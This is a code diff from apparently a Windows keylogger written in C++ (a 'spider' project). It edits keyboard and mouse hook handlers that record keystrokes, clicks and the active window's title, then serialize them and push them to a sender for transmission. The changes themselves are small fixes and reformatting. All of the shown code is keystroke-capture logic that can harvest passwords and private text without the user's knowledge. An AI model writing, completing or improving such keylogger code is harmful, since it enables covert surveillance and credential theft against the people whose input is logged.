@@ -51,8 +51,6 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
   /// retrieve the windows title for more accurate logs
   windowForeground = GetForegroundWindow();
   GetWindowText(windowForeground, windowTitle, 512);
-
-
   infos.get()->timestamp = timestamp;
   infos.get()->process = windowTitle;
   infos.get()->type = "KEYSTROKE";
@@ -124,7 +122,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
     }
   }
-  if (buff.length() > 255 || content->vkCode == VK_RETURN || content->vkCode == VK_TAB)
+  if (buff.length() > 255 || (!buff.empty() && (content->vkCode == VK_RETURN || content->vkCode == VK_TAB)))
   {
     infos.get ()->data = buff;
     spider::BufferSender::BufferSenderInstance().push(
@@ -213,8 +211,12 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
     }
   }
   if (infos.get()->keytype != KEYTYPE::KNONE)
-    spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
-  if (click == true && buff.length() != 0)
+  {
+    spider::BufferSender::BufferSenderInstance().push(
+      spider::Serializer::getSerializer().get_string_from_ptree(
+	spider::Serializer::getSerializer().serialize(*infos)));
+  }
+  if (click && !buff.empty())
   {
     kb.get()->data = buff;
     spider::BufferSender::BufferSenderInstance().push(
